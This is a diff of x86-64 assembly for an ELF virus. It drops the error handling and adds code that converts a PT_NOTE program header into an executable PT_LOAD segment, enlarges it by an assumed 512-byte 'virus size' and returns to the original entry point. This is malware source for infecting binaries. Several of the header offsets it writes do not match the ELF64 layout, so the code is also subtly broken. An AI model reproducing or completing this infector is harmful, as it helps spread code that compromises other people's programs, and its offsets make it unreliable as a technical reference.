@@ -28,8 +28,6 @@ _start:
     mov rdx, O_RDONLY
     syscall
 
-    cmp rax, 0
-    jl _exit            ; handle errors
 
     ; read the ELF file
     mov rdi, rax
@@ -38,8 +36,6 @@ _start:
     mov rax, SYS_READ
     syscall
 
-    cmp rax, 0
-    jl _exit            ; handle errors
 
     ; load the ELF file into the stack buffer
     mov qword [file_length], rax
@@ -80,13 +76,33 @@ _start:
 
 
 
-
     pt_note_found:
-    ; we have found a PT_NOTE segment, but we are not transforming it into a pt_load segment yet
+    ; change the p_type from PT_NOTE to PT_LOAD
+    mov dword [rsi], 1
 
+    ; change the p_flags to PF_R and PF_X
+    mov dword [rsi + 4], 5
 
+    ; get the file offset from r15
+    mov r13, r15
+    mov r13, [r13 + 48]
 
+    ; calculate the new virtual address for the segment
+    add r13, 0xc000000
+    mov [rsi + 16], r13
 
+    ; set the p_align to 2MB
+    mov qword [rsi + 40], 0x200000
+
+    ; add the virus size to p_filesz and p_memsz
+    add qword [rsi + 20], 0x200 ; assuming the virus size is 512 bytes
+    add qword [rsi + 28], 0x200 ; assuming the virus size is 512 bytes
+
+    ; return to the original entry point
+    mov rax, r14
+    call rax
+    
+    
     no_pt_note_found:
     ; handle the situation where no PT_NOTE segment is found
     ; print an error message or exit the program, for example
